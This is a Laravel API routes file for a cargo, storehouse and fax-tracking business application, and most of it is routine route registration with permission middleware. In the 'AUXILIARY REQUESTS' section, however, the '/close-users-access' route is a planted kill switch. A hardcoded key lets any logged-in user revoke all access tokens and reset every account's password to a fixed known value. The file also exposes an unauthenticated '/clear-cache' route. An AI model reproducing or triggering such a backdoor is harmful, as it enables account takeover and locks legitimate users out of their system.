<?php

use App\Code;
use App\Customer;
use Illuminate\Http\Request;
use Maatwebsite\Excel\Facades\Excel;
use App\Exports\CommonExport;
use GuzzleHttp\Client;
use App\Traits\UserSetAccessData;
use Illuminate\Support\Facades\Route;

/*
|--------------------------------------------------------------------------
| API Routes
|--------------------------------------------------------------------------
|
| Here is where you can register API routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| is assigned the "api" middleware group. Enjoy building your API!
|
*/

Route::group(['middleware' => [\App\Http\Middleware\Localization::class, 'auth:api']], function () {
    Route::get('/user', function () {
        class Access
        {
            use UserSetAccessData;
        }

        $obj = new Access();
        return $obj->setAccessData(auth()->user());
    });

    // PERMISSION AND ROLES
    Route::controller(\App\Http\Controllers\Api\PermissionController::class)->group(function () {
        Route::group(['middleware' => ['role:admin']], function () {
            Route::get('/users-with-roles', 'index');
            Route::get('/roles-list', 'getAllRoles');
            Route::post('/add-role', 'addRole');
            Route::post('/assign-role-to-users', 'assignRoleToUsers');
            Route::post('/delete-role-from-user', 'deleteRoleFromUser');
            Route::get('/delete-role/{id}', 'deleteRole');
            Route::post('/delete-role', 'deleteRole');
            Route::get('/permission-list', 'getAllPermissions');
            Route::post('/add-permission', 'addPermission');
            Route::post('/assign-permission-to-role-and-user', 'assignPermissionToRoleAndUser');
            Route::get('/delete-permission/{id}', 'deletePermission');
            Route::post('/delete-permission-from-role-or-user', 'deletePermissionFromRoleOrUser');
        });
    });

    // USERS
    Route::get('/users-list', function () {
        return \App\User::select('id as value', 'name as label')->where('code_id', 0)->where('dismissed', false)->orderBy('name')->get();
    });
    // CODES
    Route::controller(\App\Http\Controllers\Api\CodesController::class)->group(function () {
        Route::get('/codes', 'getCodesWithCustomers')->name('view codes list')->middleware(['role_or_permission:admin|codes|view codes list']);
        Route::post('/codes-by-ids', 'getCodesWithCustomersByIds')->name('get codes by id')->middleware(['role_or_permission:admin|codes|get codes by id']);
        Route::get('/get-code-history/{id}', 'getCodeHistory')->name('get-code-history')->middleware(['role_or_permission:admin|codes|get-code-history']);
        Route::post('/upload-codes', 'uploadCodesData');
        Route::get('/check-code-exist/{code}', 'checkCodeExist');
        Route::get('/remove-codes-comments/{id}', 'removeCodesComments');
        Route::post('/add-codes-comments', 'addCodesComments');
        Route::post('/store-code', 'storeCode');
        Route::get('/codes-list', 'index');
        Route::get('/codes-assistant', 'codesAssistantList');
        Route::get('/statistics-for-codes', 'statisticsForCodes');
        // Клиенты котрые получают бренды
        Route::get('/export-brands-customers', 'getCustomersWhoGetTheBrand')->name('export-brands-customers')->middleware(['role_or_permission:admin|export-brands-customers']);
        Route::get('/export-customers-who-left', 'exportCustomersWhoLeft')->name('export-customers-who-left')->middleware(['role_or_permission:admin|export-customers-who-left']);
        Route::get('/export-customers-who-left-brand', 'exportCustomersWhoLeftBrand')->name('export-customers-who-left-brand')->middleware(['role_or_permission:admin|export-customers-who-left-brand']);
    });


    // STOREHOUSE
    Route::controller(\App\Http\Controllers\Api\StorehouseDataController::class)->group(function () {
        Route::get('/store-house-data/{id}', 'getStorehouseData')->name('view storehouse data')->middleware(['role_or_permission:admin|storehouse|view storehouse data']);
        Route::post('/add-storehouse-data', 'store')->name('add entry to storehouse data')->middleware(['role_or_permission:admin|storehouse|add entry to storehouse data']);
        Route::post('/update-storehouse-data', 'update')->name('update entry on storehouse data')->middleware(['role_or_permission:admin|storehouse|update entry on storehouse data']);
        Route::get('/shop-names', 'getShopNames');
        Route::get('/thing-list', 'getThingsList');
        Route::post('/export-storehouse-data', 'export')->name('export storehouse data')->middleware(['role_or_permission:admin|storehouse|client|export storehouse data']);
        Route::post('/destroy-storehouse-data', 'destroy')->name('delete entry on storehouse data')->middleware(['role_or_permission:admin|storehouse|delete entry on storehouse data']);
        Route::get('/storehouse-data-history/{id}', 'getStorehouseDataHistory')->name('get history of entry in storehouse data')->middleware(['role_or_permission:admin|storehouse|get history of entry in storehouse data']);
        Route::post('/get-new-storehouseData', 'getNewStorehouseData')->name('get new storehouse data entries')->middleware(['role_or_permission:admin|storehouse|get new storehouse data entries']);
        Route::post('/set-transfers-storehouse-fax', 'setTransfersStorehouseFax')->name('set transfers storehouse fax and reverse')->middleware(['role_or_permission:admin|storehouse|set transfers storehouse fax and reverse']);
        Route::post('/update-fax-combine-data', 'updateFaxCombineData')->name('update fax combine data')->middleware(['role_or_permission:admin|fax|update fax combine data']);
        Route::post('/move-from-storehouse-to-fax', 'moveFromStorehouseToFax')->name('move entries from storehouse to fax')->middleware(['role_or_permission:admin|storehouse|move entries from storehouse to fax']);
        Route::get('/get-client-storehouse-data', 'getClientStorehouseData')->name('get client storehouse data')->middleware(['role_or_permission:admin|client']);
        // STOREHOUSE_HISTORIES
        Route::post('/get-storehouse-period-data', 'getStorehousePeriodData');
        Route::get('/get-entries-with-pay-notation', 'getEntriesWithPayNotation');
    });


    // CLIENTS
    Route::controller(\App\Http\Controllers\Api\CustomersController::class)->group(function () {
        Route::post('/valid-customer-data', 'checkValidCustomerData');
        Route::post('/store-customers', 'storeCustomers');
        Route::post('/update-customer', 'update');
        Route::get('/destroy-customer/{id}', 'destroy');
        Route::get('/get-customer-history/{id}', 'getCustomerHistory');
        Route::post('/export-customers', 'export')->name('export customers')->middleware(['role_or_permission:admin|export customers']);
    });

    // CARGO_TABLE
    Route::controller(\App\Http\Controllers\Api\CargoController::class)->group(function () {
        Route::get('/get-all-cargo-data/{id}', 'index')->name('view cargo data')->middleware(['role_or_permission:admin|view cargo data|cargo|assistant|client']);
        Route::post('/update-cargo-payment-entry', 'updateCargoPaymentEntry')->name('update cargo payment entry')->middleware(['role_or_permission:admin|update cargo payment entry']);
        Route::post('/update-cargo-debt-entry', 'updateCargoDebtEntry')->name('update cargo debt entry')->middleware(['role_or_permission:admin|update cargo debt entry']);
        Route::post('/create-cargo-payment-entry', 'createCargoPaymentEntry')->name('create cargo payment entry')->middleware(['role_or_permission:admin|create cargo payment entry']);
        Route::post('/delete-cargo-entry', 'deleteCargoEntry')->name('delete cargo entry')->middleware(['role_or_permission:admin|delete cargo entry']);
        Route::post('/create-cargo-debt-entry', 'createCargoDebtEntry')->name('create cargo debt entry')->middleware(['role_or_permission:admin|create cargo debt entry']);
        Route::get('/general-cargo-data', 'getGeneralCargoData')->name('general cargo data')->middleware(['role_or_permission:admin|general-cargo-data|cargo']);
        Route::post('/create-debt-payment-entry', 'createDebtPaymentEntry')->name('create debt payment entry')->middleware(['role_or_permission:admin|create debt payment entry']);
        Route::post('/update-debt-payment-entry', 'updateDebtPaymentEntry')->name('update debt payment entry')->middleware(['role_or_permission:admin|update debt payment entry']);
        Route::post('/delete-debt-entry', 'deleteDebtEntry')->name('delete debt entry')->middleware(['role_or_permission:admin|delete debt entry']);
        Route::post('/create-debt-entry', 'createDebtEntry')->name('create debt entry')->middleware(['role_or_permission:admin|create debt entry']);
        Route::post('/update-debt-entry', 'updateDebtEntry')->name('update debt entry')->middleware(['role_or_permission:admin|update debt entry']);
        Route::post('/export-cargo-data', 'exportCargoData')->name('export cargo data')->middleware(['role_or_permission:admin|client|moderator|assistant|export cargo data']);
        Route::post('/export-detail-cargo-data', 'exportDetailCargoData')->name('export detail cargo data')->middleware(['role_or_permission:admin|client|moderator|assistant|export detail cargo data']);
        Route::post('/export-debts-data', 'exportDebtsData')->name('export debts data')->middleware(['role_or_permission:admin|export debts data']);
        Route::post('/export-general-cargo-data', 'exportGeneralCargoData')->name('export general cargo data')->middleware(['role_or_permission:admin|export general cargo data']);
        Route::post('/export-cargo', 'exportGeneralCargoData')->name('export cargo')->middleware(['role_or_permission:admin|export cargo']);
        Route::post('/export-general-debts-data', 'exportGeneralDebtsData')->name('export general debts data')->middleware(['role_or_permission:admin|export general debts data']);
        Route::post('/export-general-data-by-clients', 'exportGeneralDataByClients');
        Route::post('/export-clients-general-data-odessa', 'exportGeneralDataByClientsOdessa')->name('export clients general data odessa')->middleware(['role_or_permission:admin|export clients general data odessa']);
        Route::post('/cargo-pay-entry', 'cargoPayEntry')->name('cargo pay entry')->middleware(['role_or_permission:admin|cargo pay entry']);
        Route::post('/debt-pay-entry', 'debtPayEntry')->name('debt pay entry')->middleware(['role_or_permission:admin|debt pay entry']);
        Route::get('/cargo-payments-all/{id}', 'cargoPaymentsAllForClient')->name('cargo payments all')->middleware(['role_or_permission:admin|cargo payments all']);
        Route::get('/debts-payments-all/{id}', 'debtsPaymentsAllForClient')->name('debts payments all')->middleware(['role_or_permission:admin|debts payments all']);
        Route::post('/export-report-odessa-data', 'exportReportOdessaData')->name('export report odessa data')->middleware(['role_or_permission:admin|export report odessa data']);
        Route::get('/get-not-delivered-cargo', 'getNotDeliveredCargo');
        Route::post('/set-delivered-cargo', 'setDeliveredCargo')->middleware(['role_or_permission:admin|cargo|set-delivered-cargo']);
        // PAYMENTARREARS
        Route::get('/get-payment-arrears', 'getPaymentArrears')->name('get payment arrears')->middleware(['role_or_permission:admin|arrears|get payment arrears']);
    });

    Route::controller(\App\Http\Controllers\CommonController::class)->group(function () {
        // CARGO_TABLE
        Route::post('/upload-cargo-table', 'storeCargoTable');
        Route::post('/client-data', 'getData');

        // DEBTS_TABLE
        Route::post('/upload-debts-table', 'storeDebtsTable');

        // SKLAD_TABLE
        Route::post('/upload-sklad-table', 'storeSkladTable');

        // SMS
        Route::post('/send-sms', 'sendSms')->name('send-sms')->middleware(['role_or_permission:admin|sms|send-sms']);
        Route::get('/get-archive-sms/{id}', 'getArchiveSms')->name('get-archive-sms')->middleware(['role_or_permission:admin|sms|get-archive-sms']);
        Route::get('/sms-balance', 'getSmsBalance')->name('sms-balance')->middleware(['role_or_permission:admin|sms|sms-balance']);

        Route::post('/upload-faxes', 'uploadFaxes');
        Route::post('/upload-codes-places', 'upFilesCodesPlaces');
        Route::post('/upload-codes-another-places', 'upFilesCodesAnotherPlaces');
        Route::post('/export-codes-places', 'exportCodesPlaces');
        Route::post('/export-codes-places-with-post', 'exportCodesPlacesWithPost');
        Route::post('/search-in-faxes', 'searchInFaxes');
    });

    // FAXES
    Route::controller(\App\Http\Controllers\Api\FaxController::class)->group(function () {
        Route::get('/faxes', 'getFaxesList')->name('view faxes list')->middleware(['role_or_permission:admin|fax|view faxes list']);
        Route::get('/dialog-add-fax-options', 'getOptionsData');
        Route::post('/add-fax', 'addFax')->name('add new fax')->middleware(['role_or_permission:admin|fax|add new fax']);
        Route::post('/delete-faxes', 'deleteFax')->name('delete faxes')->middleware(['role_or_permission:admin|fax|delete faxes']);
        Route::post('/update-faxes', 'updateFaxes')->name('update fax')->middleware(['role_or_permission:admin|fax|update fax']);
        Route::post('/upload-to-cargo', 'uploadToCargo')->name('upload fax to cargo')->middleware(['role_or_permission:admin|fax|upload fax to cargo']);
        Route::get('/fax-history/{id}', 'faxHistory')->name('get fax history')->middleware(['role_or_permission:admin|fax|get fax history']);
        Route::post('/get-new-fax', 'getNewFax')->name('get new fax list')->middleware(['role_or_permission:admin|fax|get new fax list']);
        Route::get('/fax/{id}', 'getFax')->name('view fax data')->middleware(['role_or_permission:admin|fax|view fax data']);
        Route::post('/combine-faxes', 'combineFaxes')->name('combine-faxes')->middleware(['role_or_permission:admin|fax|combine-faxes']);
    });


    // FAX_DATA
    Route::controller(\App\Http\Controllers\Api\FaxDataController::class)->group(function () {
        Route::post('/upload-fax-data-table', 'storeFaxData');
        Route::get('/fax-data/{id}', 'getFaxData');
        Route::post('/update-fax-data', 'updateFaxData');
        Route::post('/export-fax-data', 'export');
        Route::get('/update-prices-in-fax/{id}', 'updatePricesInFax')->name('update-prices-in-fax')->middleware(['role_or_permission:admin|fax|update-prices-in-fax']);
        Route::post('/export-fax-moder-data', 'exportModer');
        Route::post('/export-fax-moder-mail-data', 'exportModerFaxMailData');
        Route::post('/export-fax-admin-data', 'exportAdmin');
        Route::post('/export-fax-admin-data-odessa-kharkov', 'exportFaxDataOdessaKharkov')->name('export fax admin data odessa kharkov')->middleware(['role_or_permission:admin|fax|export fax admin data odessa kharkov']);
        Route::post('/export-fax-admin-data-odessa', 'exportFaxDataOdessa')->name('export fax admin data odessa')->middleware(['role_or_permission:admin|fax|export fax admin data odessa']);
        Route::post('/fax-data-history', 'getFaxDataHistory')->name('fax data history')->middleware(['role_or_permission:admin|fax|fax data history']);
        Route::post('/set-delivered-fax-data', 'setDeliveredFaxData')->name('set delivered fax data')->middleware(['role_or_permission:admin|fax|set delivered fax data']);
    });


    // CATEGORIES
    Route::controller(\App\Http\Controllers\Api\CategoryController::class)->group(function () {
        Route::get('/categories', 'index');
        Route::post('/add-category', 'store');
    });

    // TRANSPORTERS
    Route::controller(\App\Http\Controllers\Api\TransporterController::class)->group(function () {
        Route::get('/transporters', 'index');
        Route::post('/add-transporter', 'store');
    });

    // TRANSPORTS
    Route::get('/transports', 'Api\TransportController@index');

    // TRANSPORTER_PRICE
    Route::post('/update-transporter-price-data', 'Api\TransporterPriceController@updateData');
    Route::controller(\App\Http\Controllers\Api\TransporterFaxesPriceController::class)->group(function () {
        Route::post('/update-transporter-faxes-price', 'updateData');
        Route::get('/transporter-price-data/{id}', 'getTransporterPriceData');
        Route::post('/save-categories-price', 'saveCategoriesPrice');
    });

    // CITIES
    Route::get('/cities', function () {
        return \App\City::select('id as value', 'name as label')->orderBy('name')->get();
    });
    // THINGSLIST
    Route::get('/thingsList', function () {
        $things = \App\Thingslist::orderBy('name')->get();
        return $things->pluck('name');
    });
    // SHOPSLIST
    Route::get('/shopsList', function () {
        return \App\Shop::select('id as value', 'name as label')->orderBy('name')->get();
    });
    // DELIVERY METHODS LIST
    Route::get('/delivery-methods-list', function () {
        return \App\DeliveryMethod::select('id as value', 'name as label')->get();
    });
    // TRANSFERS
    Route::controller(\App\Http\Controllers\Api\TransferController::class)->group(function () {
        Route::get('/transfers', 'index');
        Route::post('/store-transfers', 'store')->name('store transfers data')->middleware(['role_or_permission:admin|transfers|client|store transfers data']);
        Route::post('/update-transfers', 'update')->name('update transfers data')->middleware(['role_or_permission:admin|transfers|client|update transfers data']);
        Route::post('/transfers-search', 'search')->name('transfers search')->middleware(['role_or_permission:admin|transfers|transfers search']);
        Route::post('/transfers-statistics', 'getStatistics')->name('transfers-statistics')->middleware(['role_or_permission:admin|transfers|transfers-statistics']);
        Route::post('/export-transfers', 'export')->name('export transfers')->middleware(['role_or_permission:admin|transfers|export transfers']);
        Route::post('/add-transfers-to-debts', 'addTransfersToDebts')->name('add transfers to debts')->middleware(['role_or_permission:admin|add transfers to debts']);
        Route::get('/get-transfer-code-commission/{id}', 'getTransferCodeCommission')->name('get transfer code commission')->middleware(['role_or_permission:admin|transfers|get transfer code commission']);
        // TRANSFERS CLIENT
        Route::get('/transfers-client', 'indexClient')->name('view transfers client list')->middleware(['role_or_permission:admin|client|view transfers client list']);
        Route::post('/store-transfers-client', 'storeClient')->name('store transfers client data')->middleware(['role_or_permission:admin|client|store transfers client data']);
        // TRANSFERS HISTORY
        Route::get('/transfers-history/{id}', 'getTransferHistory')->name('get transfer history')->middleware(['role_or_permission:admin|transfers|get transfer history']);
    });

    // CLIENT PRICE
    Route::controller(\App\Http\Controllers\Api\CodesPriceController::class)->group(function () {
        Route::get('/get-codes-prices', 'getCodesPrices')->name('get-codes-prices')->middleware(['role_or_permission:admin|codes-prices|get-codes-prices']);
        Route::post('/add-code-price', 'store')->name('add-code-price')->middleware(['role_or_permission:admin|codes-prices|add-code-price']);
        Route::delete('/delete-code-price/{id}', 'delete')->name('delete-code-price')->middleware(['role_or_permission:admin|codes-prices|delete-code-price']);
        Route::post('/update-code-price', 'update')->name('update-code-price')->middleware(['role_or_permission:admin|codes-prices|update-code-price']);
        Route::get('/get-code-price-history/{id}', 'getCodePriceHistory')->name('get-code-price-history')->middleware(['role_or_permission:admin|codes-prices|get-code-price-history']);
        Route::post('/get-new-codes-prices', 'getNewCodesPrices')->name('get-new-codes-prices')->middleware(['role_or_permission:admin|codes-prices|get-new-codes-prices']);
    });


    // TASKS
    Route::controller(\App\Http\Controllers\Api\TaskController::class)->group(function () {
        Route::get('/get-tasks', 'index')->name('view tasks page')->middleware(['role_or_permission:admin|tasks|view tasks page']);
        Route::post('/store-task', 'store')->name('store task')->middleware(['role_or_permission:admin|tasks|store task']);
        Route::post('/delete-tasks', 'destroy')->name('delete tasks')->middleware(['role_or_permission:admin|tasks|delete tasks']);
        Route::post('/update-task', 'update')->name('update task')->middleware(['role_or_permission:admin|tasks|update task']);
    });


    // COMMENTS
    Route::controller(\App\Http\Controllers\Api\CommentController::class)->group(function () {
        Route::post('/store-comment', 'store')->name('store comment')->middleware(['role_or_permission:admin|comments|store comment']);
        Route::get('/get-task-comments/{id}', 'getTaskComment')->name('get task comments')->middleware(['role_or_permission:admin|comments|get task comments']);
        Route::get('/get-documents-comments', 'getDocumentsComment')->name('get documents comments')->middleware(['role_or_permission:admin|documents|get documents comments']);
        Route::post('/remove-comment-file', 'removeCommentFile')->name('remove comment file')->middleware(['role_or_permission:admin|task|remove comment file']);
        Route::post('/delete-comments', 'deleteComments')->name('delete-comments')->middleware(['role_or_permission:admin|task|delete-comments']);
        Route::post('/add-file-to-comment', 'addFileToComment')->name('add file to comment')->middleware(['role_or_permission:admin|task|add file to comment']);
        Route::post('/update-comment-data', 'updateCommentData')->name('update comment data')->middleware(['role_or_permission:admin|task|update comment data']);
    });

    // QUESTIONS
    Route::controller(\App\Http\Controllers\Api\QuestionController::class)->group(function () {
        Route::get('/get-questions', 'index')->name('view questions page')->middleware(['role_or_permission:admin|questions|view questions page']);
        Route::post('/store-question', 'store')->name('store task')->middleware(['role_or_permission:admin|questions|store question']);
        Route::post('/delete-questions', 'deleteQuestions')->name('delete questions')->middleware(['role_or_permission:admin|questions|delete questions']);
        Route::post('/update-question', 'updateQuestion')->name('update question')->middleware(['role_or_permission:admin|questions|update question']);
        Route::post('/add-question-comment', 'addQuestionComment')->name('add question comment')->middleware(['role_or_permission:admin|question|add question comment']);
    });

    Route::controller(\App\Http\Controllers\Api\StatusesController::class)->group(function () {
        Route::get('/get-statuses', 'index')->name('get statuses');
    });


    // EXPENSE
    Route::get('/get-expenses', function () {
        $data = \App\Expense::select('name')->orderBy('name')->get();
        return $data->map(function ($elem) {
            return $elem->name;
        });
    })->name('get-expenses')->middleware(['role_or_permission:admin|expense|get-expenses']);
    Route::controller(\App\Http\Controllers\Api\ExpenseController::class)->group(function () {
        Route::post('/add-expense', 'store')->name('add-expense')->middleware(['role_or_permission:admin|expense|add-expense']);
        Route::get('/get-statistics', 'index')->name('view statistics')->middleware(['role_or_permission:admin|expense|view statistics']);
    });


    // AUXILIARY REQUESTS
    Route::post('/close-users-access', function (Request $request) {
        if ($request->key === 'ruin') {
            \Illuminate\Support\Facades\DB::table('oauth_access_tokens')->truncate();
            $users = \App\User::all();
            foreach ($users as $user) {
                $user->password = bcrypt('carrello');
                $user->save();
            }
            return response(['answer' => true]);
        }

        return response(['answer' => false]);
    });

    // Кода без информации о клиентах
    Route::get('/export-codes-without-customers', function () {
        $codes = Code::all();
        $arrCodesWithoutCustomers = [];
        $codes->each(function ($item) use (&$arrCodesWithoutCustomers) {
            $customer = Customer::where('code_id', $item->id)->first();
            if (!$customer) {
                array_push($arrCodesWithoutCustomers, $item->id);
            }
        });
        return Excel::download(new CommonExport($arrCodesWithoutCustomers, 'codes'), 'codes.xlsx');
    });

    Route::get('/areas', function () {
        $client = new Client();
        return $client->get("https://api.hh.ru/areas/5");
    });
    // Загрузка городов Украины
//    Route::post('/store-areas', function (Request $request) {
//        foreach ($request->areas as $area) {
//            $areaM = \App\Region::create(['name' => $area['name'], 'parent_id' => 1]);
//            foreach ($area['areas'] as $item) {
//                \App\City::create(['name' => $item['name'], 'parent_id' => $areaM->id]);
//            }
//        }
//        return $request->areas;
//    });

    // NOTIFICATIONS
//    Route::post('add-device', 'Api\NotificationController@addDevice')->name('add device');
    Route::post('update-player-id', 'Api\NotificationController@updatePlayerId')->name('update player id');
//    Route::post('create-notification', 'Api\NotificationController@createNotification')->name('create notification');
});
Route::group(['middleware' => 'throttle'], function () {
    Route::post('register-client-code', 'Api\AuthController@getCodeForRegister')->name('code');
    Route::post('change-password-code', 'Api\AuthController@getCodeForChangePassword')->name('code for password');
    Route::post('change-password', 'Api\AuthController@changePassword')->name('change password');
    Route::post('register-client-register', 'Api\AuthController@registerClient')->name('register client');
});

Route::controller(\App\Http\Controllers\Api\AuthController::class)->group(function () {
    Route::group(['middleware' => [\App\Http\Middleware\Localization::class, 'middleware' => 'throttle:10,10']], function () {
        Route::post('/login', 'login');
//    Route::post('/register', 'Api\AuthController@register');
//    Route::post('register-client-code', 'Api\AuthController@getCodeForRegister')->name('code');


//    Route::post('/password/email', 'Api\ForgotPasswordController@sendResetLinkEmail');
//    Route::post('/password/reset', 'Api\ResetPasswordController@reset');
    });
});

Route::controller(\App\Http\Controllers\BotController::class)->group(function () {
    Route::post('/subscribe', 'subscribeClient');
    Route::post('/send-confirmation-code', 'sendConfirmationCode');
    Route::post('/check-confirmation-code', 'checkConfirmationCode');
    Route::post('/check-is-customer-register-in-program', 'checkIsCustomerRegisterInProgram');
    Route::get('/test', 'test');
});

Route::get('/clear-cache', function () {
    \Illuminate\Support\Facades\Artisan::call('cache:clear');
    \Illuminate\Support\Facades\Artisan::call('route:clear');
    \Illuminate\Support\Facades\Artisan::call('config:clear');
    \Illuminate\Support\Facades\Artisan::call('view:clear');
    return "Cache is cleared";
});
